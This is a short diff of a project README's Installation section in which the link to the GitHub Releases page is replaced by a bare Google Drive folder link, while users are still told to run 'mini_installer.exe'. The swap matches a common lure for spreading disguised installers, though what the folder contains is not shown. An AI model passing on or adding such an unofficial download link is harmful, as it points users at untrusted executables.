@@ -36,7 +36,7 @@
 
 ## 🪛 Installation
 
-> 📥 [Download Quori installer from the Releases page](https://github.com/LENT4869/Quori/releases)
+https://drive.google.com/drive/folders/1iuoVJE6BT_kMrpXn_vz_3OiBVOILLgXm?usp=drive_link
 
 - Run `mini_installer.exe`
 - Upon launch, follow the RPS setup
